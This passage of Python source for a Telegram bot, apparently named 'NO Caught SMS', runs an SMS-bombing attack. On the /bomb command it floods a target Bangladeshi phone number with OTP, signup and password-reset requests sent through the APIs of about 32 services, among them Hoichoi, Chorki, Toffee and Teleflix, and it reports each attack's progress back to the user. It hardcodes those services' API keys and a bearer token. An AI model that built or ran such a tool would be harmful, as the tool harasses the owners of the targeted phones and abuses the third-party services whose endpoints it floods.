                    'x-api-key': 'PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef',
                    'origin': 'https://www.hoichoi.tv',
                    'referer': 'https://www.hoichoi.tv/',
                    'user-agent': 'Mozilla/5.0'
                }
                data_hoichoi = {"phoneNumber": f"+88{clean_number}", "requestType": "send", "screenName": "signin"}
                res = session.post(url_hoichoi_signin, params=params_hoichoi, json=data_hoichoi, headers=headers_hoichoi, timeout=5)
                if res.status_code in [200, 201]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Hoichoi Signin] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Hoichoi Signin] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Hoichoi Signin] ✗ Failed"
                })
            
            # 24. Hoichoi Signup - Fixed
            try:
                url_hoichoi_signup = "https://prod-api.viewlift.com/identity/signup"
                params_hoichoi = {"site": "hoichoitv"}
                headers_hoichoi = {
                    'content-type': 'application/json',
                    'x-api-key': 'PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef',
                    'origin': 'https://www.hoichoi.tv',
                    'referer': 'https://www.hoichoi.tv/',
                    'user-agent': 'Mozilla/5.0'
                }
                data_hoichoi = {"phoneNumber": f"+88{clean_number}", "requestType": "send", "whatsappConsent": False}
                res = session.post(url_hoichoi_signup, params=params_hoichoi, json=data_hoichoi, headers=headers_hoichoi, timeout=5)
                if res.status_code in [200, 201]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Hoichoi Signup] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Hoichoi Signup] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Hoichoi Signup] ✗ Failed"
                })
            
            # 25. Chorki - Fixed
            try:
                url_chorki = "https://api-dynamic.chorki.com/v2/auth/login"
                params_chorki = {"country": "BD", "platform": "web", "language": "en"}
                headers_chorki = {
                    'accept': 'application/json',
                    'content-type': 'application/json',
                    'origin': 'https://www.chorki.com',
                    'referer': 'https://www.chorki.com/',
                    'user-agent': 'Mozilla/5.0'
                }
                data_chorki = {"number": f"+88{clean_number}"}
                res = session.post(url_chorki, params=params_chorki, json=data_chorki, headers=headers_chorki, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Chorki] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Chorki] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Chorki] ✗ Failed"
                })
            
            # 26. Addatimes - Working
            try:
                url_addatimes = "https://app.addatimes.com/api/register"
                headers_addatimes = {
                    'content-type': 'application/json',
                    'origin': 'https://www.addatimes.com',
                    'referer': 'https://www.addatimes.com/',
                    'user-agent': 'Mozilla/5.0'
                }
                data_addatimes = {
                    "phone": clean_number,
                    "email": "user@gmail.com",
                    "country_code": "BD",
                    "password": "pass123",
                    "confirm_password": "pass123"
                }
                res = session.post(url_addatimes, json=data_addatimes, headers=headers_addatimes, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Addatimes] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Addatimes] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Addatimes] ✗ Failed"
                })
            
            # 27. Deeptoplay - Fixed
            try:
                url_deepto = "https://api.deeptoplay.com/v2/auth/login"
                params_deepto = {"country": "BD", "platform": "web", "language": "en"}
                headers_deepto = {
                    'accept': 'application/json',
                    'content-type': 'application/json',
                    'origin': 'https://www.deeptoplay.com',
                    'referer': 'https://www.deeptoplay.com/',
                    'user-agent': 'Mozilla/5.0'
                }
                data_deepto = {"number": f"+88{clean_number}"}
                res = session.post(url_deepto, params=params_deepto, json=data_deepto, headers=headers_deepto, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Deeptoplay] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Deeptoplay] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Deeptoplay] ✗ Failed"
                })
            
            # 28. Teleflix Signup - Working
            try:
                url_tf_signup = "https://teleflix.com.bd/home/signupsubmit"
                headers_tf_signup = {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': 'https://teleflix.com.bd',
                    'Referer': 'https://teleflix.com.bd/home/signin',
                    'User-Agent': 'Mozilla/5.0'
                }
                data_tf_signup = f"msisdn-signup={clean_number}&register-submit=Sign+Up"
                res = session.post(url_tf_signup, data=data_tf_signup, headers=headers_tf_signup, timeout=5)
                if res.status_code in [200, 302]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Teleflix Signup] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Teleflix Signup] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Teleflix Signup] ✗ Failed"
                })
            
            # 29. Teleflix Forgot - Working
            try:
                url_tf_forgot = "https://teleflix.com.bd/index.php/home/forgotpass"
                headers_tf_forgot = {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': 'https://teleflix.com.bd',
                    'Referer': 'https://teleflix.com.bd/home/signupsubmit',
                    'User-Agent': 'Mozilla/5.0'
                }
                data_tf_forgot = f"msisdn-forgot={clean_number}&forgot-submit=Send+Password"
                res = session.post(url_tf_forgot, data=data_tf_forgot, headers=headers_tf_forgot, timeout=5)
                if res.status_code in [200, 302]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Teleflix Forgot] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Teleflix Forgot] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Teleflix Forgot] ✗ Failed"
                })
            
            # 30. Toffee - Fixed
            try:
                url_toffee = "https://prod-services.toffeelive.com/sms/v1/subscriber/otp"
                headers_toffee = {
                    'content-type': 'application/json',
                    'origin': 'https://toffeelive.com',
                    'referer': 'https://toffeelive.com/',
                    'user-agent': 'Mozilla/5.0',
                    'accept': 'application/json'
                }
                data_toffee = {"target": f"88{clean_number}", "resend": False}
                res = session.post(url_toffee, json=data_toffee, headers=headers_toffee, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Toffee] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Toffee] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Toffee] ✗ Failed"
                })
            
            # 31. Sundarban - Working
            try:
                url_sundarban = "https://api-gateway.sundarbancourierltd.com/graphql"
                headers_sundarban = {
                    'content-type': 'application/json',
                    'origin': 'https://customer.sundarbancourierltd.com',
                    'referer': 'https://customer.sundarbancourierltd.com/',
                    'user-agent': 'Mozilla/5.0',
                    'accept': 'application/json'
                }
                data_sundarban = {
                    "operationName": "IsValidUser",
                    "variables": {"userName": clean_number, "userType": "customer"},
                    "query": "query IsValidUser($userName: String!, $userType: String!) { isValidUser(userName: $userName, userType: $userType) { message statusCode result __typename } }"
                }
                res = session.post(url_sundarban, json=data_sundarban, headers=headers_sundarban, timeout=5)
                if res.status_code == 200:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Sundarban] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Sundarban] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Sundarban] ✗ Failed"
                })



            # Shomvob
            try:
                url_shomvob = "https://backend-api.shomvob.co/api/v2/otp/phone"
                headers_shomvob = {
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'en-US,en;q=0.9',
                    'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY1OTg5NTcwOH0.IOdKen62ye0N9WljM_cj3Xffmjs3dXUqoJRZ_1ezd4Q',
                    'content-type': 'application/json',
                    'origin': 'https://app.shomvob.co',
                    'priority': 'u=1, i',
                    'referer': 'https://app.shomvob.co/auth/',
                    'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'
                }
                data_shomvob = {
                    "phone": f"880{clean_number}",
                    "is_retry": 0
                }
                res = session.post(url_shomvob, json=data_shomvob, headers=headers_shomvob, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Shomvob] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Shomvob] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except Exception as e:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Shomvob] ✗ Failed"
                })
            
            # 32. Zatiq Easy - Working
            try:
                url_zatiq = "https://easybill.zatiq.tech/api/auth/v1/send_otp"
                headers_zatiq = {
                    'content-type': 'application/json',
                    'application-type': 'Merchant',
                    'device-type': 'Web',
                    'origin': 'https://merchant.zatiqeasy.com',
                    'referer': 'https://merchant.zatiqeasy.com/',
                    'user-agent': 'Mozilla/5.0',
                    'accept': 'application/json'
                }
                data_zatiq = {
                    "code": "+880",
                    "country_code": "BD",
                    "phone": clean_number,
                    "is_existing_user": False
                }
                res = session.post(url_zatiq, json=data_zatiq, headers=headers_zatiq, timeout=5)
                if res.status_code in [200, 201, 202]:
                    cycle_success += 1
                    success += 1
                    status_text = f"[Zatiq Easy] ✓ {res.status_code}"
                else:
                    cycle_failed += 1
                    failed += 1
                    status_text = f"[Zatiq Easy] ? {res.status_code}"
                
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': status_text
                })
            except:
                cycle_failed += 1
                failed += 1
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': "[Zatiq Easy] ✗ Failed"
                })
            
            # Send cycle summary
            try:
                summary_text = f"📊 **CYCLE {cycle_num}/{MAX_CYCLES} SUMMARY**\n✓ Success: {cycle_success}\n✗ Failed: {cycle_failed}\n📈 Total: ✓{success} ✗{failed}"
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': summary_text,
                    'parse_mode': 'Markdown',
                    'reply_markup': json.dumps({'inline_keyboard': [[{'text': '🛑 STOP ATTACK', 'callback_data': f'stop_{user_id}'}]]})
                })
            except:
                pass
            
            # Wait 5 seconds between cycles
            if cycle_num < MAX_CYCLES and not (user_id in active_attacks and active_attacks[user_id].get('stop', False)) and not server_is_shutting_down:
                for i in range(5, 0, -1):
                    if user_id in active_attacks and active_attacks[user_id].get('stop', False):
                        break
                    if server_is_shutting_down:
                        break
                    time.sleep(1)
        
        # Auto-stop complete message
        if cycle_num >= MAX_CYCLES and user_id in active_attacks and not active_attacks[user_id].get('stop', False):
            auto_stop_msg = (
                f"⏱️ **AUTO-STOP COMPLETED**\n\n"
                f"Attack finished after {MAX_CYCLES} cycles.\n"
                f"Target: `{full_number}`\n"
                f"Final Stats: ✓{success} | ✗{failed}\n\n"
                f"Use /bomb to start a new attack."
            )
            try:
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': chat_id,
                    'text': auto_stop_msg,
                    'parse_mode': 'Markdown'
                })
            except:
                pass
                
    except Exception as e:
        log_activity(f"Error in bombing thread for {username}: {e}")
    finally:
        if user_id in active_attacks:
            del active_attacks[user_id]
        log_activity(f"Attack {'auto-stopped' if cycle_num >= MAX_CYCLES else 'stopped'} by {username} - Cycles: {cycle_num}, Success: {success}, Failed: {failed}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send a message when the command /start is issued."""
    user = update.effective_user
    track_user(user.id, user.username, user.first_name)
    
    welcome_message = (
        f"👋 **Welcome {user.first_name}!**\n\n"
        f"🔥 **NO Caught SMS**\n"
        f"Developed by `Mr.MorningStar`\n\n"
        f"**Server Status:** 🟢 ONLINE\n"
        f"**Total Users:** {bot_stats['total_users']}\n"
        f"**Total Attacks:** {bot_stats['total_attacks']}\n"
        f"**Total Sites:** 32\n\n"
        f"**Features:**\n"
        f"• Auto-stop after 3 cycles\n"
        f"• 32 Bangladeshi services\n"
        f"• 5-second delay between cycles\n"
        f"• Real-time status updates\n\n"
        f"**Commands:**\n"
        f"/bomb <number> - Start bombing\n"
        f"/stop - Stop current attack\n"
        f"/stats - View your stats\n"
        f"/server - Check server status\n"
        f"/help - Show help menu\n\n"
        f"**Example:** `/bomb 01749XXXXXX`"
    )
    
    keyboard = [
        [InlineKeyboardButton("💣 START BOMBING", callback_data="bomb")],
        [InlineKeyboardButton("📊 MY STATS", callback_data="mystats")],
        [InlineKeyboardButton("🖥️ SERVER STATUS", callback_data="server")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(welcome_message, reply_markup=reply_markup, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /help command"""
    help_text = (
        "🆘 **HELP MENU**\n\n"
        "**Commands:**\n"
        "• `/start` - Start the bot\n"
        "• `/bomb <number>` - Start bombing (e.g., `/bomb 01749XXXXX`)\n"
        "• `/stop` - Stop current attack\n"
        "• `/stats` - View your usage statistics\n"
        "• `/server` - Check server status\n"
        "• `/help` - Show this help menu\n\n"
        "**How to use:**\n"
        "1. Send `/bomb 01749XXXXX` or click START BOMBING button\n"
        "2. Bot will send requests to 32 sites every 5 seconds\n"
        "3. Attack auto-stops after 3 cycles\n"
        "4. Use `/stop` to end earlier\n\n"
        "**Developer:** `Mr.MorningStar`"
    )
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()
    user = update.effective_user
    
    if query.data == "bomb":
        await query.edit_message_text("📱 **Enter target number:**\nExample: `01749XXXXX`", parse_mode='Markdown')
        context.user_data['awaiting_number'] = True
    
    elif query.data == "mystats":
        user_id_str = str(user.id)
        if user_id_str in bot_users:
            data = bot_users[user_id_str]
            stats_text = (
                f"📊 **YOUR STATS**\n\n"
                f"👤 Username: @{data['username'] or 'None'}\n"
                f"📝 Name: {data['first_name']}\n"
                f"🕐 First Seen: {data['first_seen']}\n"
                f"🕒 Last Seen: {data['last_seen']}\n"
                f"💣 Total Attacks: {data['total_attacks']}\n"
                f"💬 Total Messages: {data['total_messages']}"
            )
            await query.edit_message_text(stats_text, parse_mode='Markdown')
        else:
            await query.edit_message_text("❌ No stats found!", parse_mode='Markdown')
    
    elif query.data == "server":
        uptime = datetime.now() - datetime.strptime(bot_stats['start_time'], "%Y-%m-%d %H:%M:%S")
        hours = uptime.total_seconds() // 3600
        minutes = (uptime.total_seconds() % 3600) // 60
        
        server_text = (
            f"🖥️ **SERVER STATUS**\n\n"
            f"Status: 🟢 **ONLINE**\n"
            f"Started: {bot_stats['start_time']}\n"
            f"Uptime: {int(hours)}h {int(minutes)}m\n"
            f"👥 Total Users: {bot_stats['total_users']}\n"
            f"💣 Total Attacks: {bot_stats['total_attacks']}\n"
            f"🌐 Total Sites: 32\n"
            f"⚡ Auto-stop: 3 cycles\n"
            f"👨‍💻 Developer: `Mr.MorningStar`"
        )
        await query.edit_message_text(server_text, parse_mode='Markdown')
    
    elif query.data.startswith("stop_"):
        attack_user_id = int(query.data.split("_")[1])
        if attack_user_id in active_attacks:
            active_attacks[attack_user_id]['stop'] = True
            await query.edit_message_text("🛑 Attack stopped successfully!")
        else:
            await query.edit_message_text("❌ No active attack found!")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle regular messages"""
    user = update.effective_user
    track_user(user.id, user.username, user.first_name)
    
    if context.user_data.get('awaiting_number'):
        raw_number = update.message.text.strip()
        context.user_data['awaiting_number'] = False
        
        # Format number
        full_number, clean_number = format_phone_number(raw_number)
        
        if not full_number or not clean_number:
            await update.message.reply_text("❌ Invalid phone number format! Use: 017XXXXXXXX")
            return
            
        user_id = user.id
        chat_id = update.effective_chat.id
        
        # Check if already bombing
        if user_id in active_attacks:
            await update.message.reply_text("⚠️ You already have an active attack! Use /stop first.", parse_mode='Markdown')
            return
        
        # Store attack info
        active_attacks[user_id] = {'stop': False}
        
        # Send start message with stop button
        stop_keyboard = [[InlineKeyboardButton("🛑 STOP ATTACK", callback_data=f"stop_{user_id}")]]
        reply_markup = InlineKeyboardMarkup(stop_keyboard)
        
        await update.message.reply_text(
            f"💣 **ATTACK STARTED!**\n\n"
            f"Target: `{full_number}`\n"
            f"Total Sites: 32\n"
            f"Auto-stop after 3 cycles\n"
            f"Waiting 5 seconds between cycles...\n\n"
            f"Click the STOP button below to end early.",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        
        # Start bombing in thread
        thread = threading.Thread(
            target=bombing_worker,
            args=(chat_id, full_number, clean_number, raw_number, user_id, user.username or user.first_name)
        )
        thread.daemon = True
        thread.start()
    
    else:
        await update.message.reply_text("Use /start to begin or /bomb <number> to start")

async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /bomb command"""
    if not context.args:
        await update.message.reply_text("Usage: /bomb <phone_number>\nExample: /bomb 01749XXXXX")
        return
    
    user = update.effective_user
    raw_number = context.args[0]
    
    # Format number
    full_number, clean_number = format_phone_number(raw_number)
    
    if not full_number or not clean_number:
        await update.message.reply_text("❌ Invalid phone number format! Use: 017XXXXXXXX")
        return
    
    user_id = user.id
    chat_id = update.effective_chat.id
    
    # Check if already bombing
    if user_id in active_attacks:
        await update.message.reply_text("⚠️ You already have an active attack! Use /stop first.", parse_mode='Markdown')
        return
    
    # Store attack info
    active_attacks[user_id] = {'stop': False}
    
    # Send start message with stop button
    stop_keyboard = [[InlineKeyboardButton("🛑 STOP ATTACK", callback_data=f"stop_{user_id}")]]
    reply_markup = InlineKeyboardMarkup(stop_keyboard)
    
    await update.message.reply_text(
        f"💣 **ATTACK STARTED!**\n\n"
        f"Target: `{full_number}`\n"
        f"Total Sites: 32\n"
        f"Auto-stop after 3 cycles\n"
        f"Waiting 5 seconds between cycles...\n\n"
        f"Click the STOP button below to end early.",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )
    
    # Start bombing in thread
    thread = threading.Thread(
        target=bombing_worker,
        args=(chat_id, full_number, clean_number, raw_number, user_id, user.username or user.first_name)
    )
    thread.daemon = True
    thread.start()

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /stop command"""
    user_id = update.effective_user.id
    
    if user_id in active_attacks:
        active_attacks[user_id]['stop'] = True
        await update.message.reply_text("🛑 Stopping attack...", parse_mode='Markdown')
    else:
        await update.message.reply_text("❌ No active attack found!", parse_mode='Markdown')

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /stats command"""
    user = update.effective_user
    user_id_str = str(user.id)
    
    if user_id_str in bot_users:
        data = bot_users[user_id_str]
        stats_text = (
            f"📊 **YOUR STATS**\n\n"
            f"👤 Username: @{data['username'] or 'None'}\n"
            f"📝 Name: {data['first_name']}\n"
            f"🕐 First Seen: {data['first_seen']}\n"
            f"🕒 Last Seen: {data['last_seen']}\n"
            f"💣 Total Attacks: {data['total_attacks']}\n"
            f"💬 Total Messages: {data['total_messages']}"
        )
        await update.message.reply_text(stats_text, parse_mode='Markdown')
    else:
        await update.message.reply_text("❌ No stats found!", parse_mode='Markdown')

async def server_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /server command"""
    uptime = datetime.now() - datetime.strptime(bot_stats['start_time'], "%Y-%m-%d %H:%M:%S")
    hours = uptime.total_seconds() // 3600
    minutes = (uptime.total_seconds() % 3600) // 60
    
    server_text = (
        f"🖥️ **SERVER STATUS**\n\n"
        f"Status: 🟢 **ONLINE**\n"
        f"Started: {bot_stats['start_time']}\n"
        f"Uptime: {int(hours)}h {int(minutes)}m\n"
        f"👥 Total Users: {bot_stats['total_users']}\n"
        f"💣 Total Attacks: {bot_stats['total_attacks']}\n"
        f"👨‍💻 Developer: `Mr.MorningStar`"
    )
    await update.message.reply_text(server_text, parse_mode='Markdown')

def main():
    """Start the bot"""
    # Load saved data
    load_data()
    
    # Clear screen and show header
    clear_screen()
    
    # Log server start
    log_activity("Server started - Bot is now online with 32 sites!")
    
    # Send notification to all users that server is online
    if bot_stats.get('total_users', 0) > 0:
        online_msg = (
            "🟢 **SERVER ONLINE NOTICE**\n\n"
            "The bot server is now back online with 32 sites!\n"
            "All sites are working like before.\n"
            "You can resume using the bot.\n\n"
            "Thank you for using @MorningStar_Bot"
        )
        
        print("\n" + "="*60)
        print("SENDING ONLINE NOTIFICATION TO ALL USERS...")
        print("="*60)
        
        # Create a thread for notification to not block startup
        notification_thread = threading.Thread(
            target=notify_all_users,
            args=(online_msg,)
        )
        notification_thread.daemon = True
        notification_thread.start()
        
        print("✓ Notification sending in background...")
        print("="*60 + "\n")
    
    # Start terminal command thread
    print("📟 Terminal commands available: Type 'help' for list\n")
    print(f"🌐 Total Sites Loaded: 32")
    terminal_thread = threading.Thread(target=terminal_commands, daemon=True)
    terminal_thread.start()
    
    # Create the Application
    application = Application.builder().token(BOT_TOKEN).build()

    # Register handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("bomb", bomb_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("server", server_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    # Start the bot
    print("🤖 Bot is running! Press Ctrl+C to stop.")
    application.run_polling()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n⚠️ Keyboard interrupt received...")
        server_shutdown()
        sys.exit(0)
    except Exception as e:
        print(f"\n❌ Error: {e}")
        log_activity(f"Server error: {e}")
        server_shutdown()
        sys.exit(1)
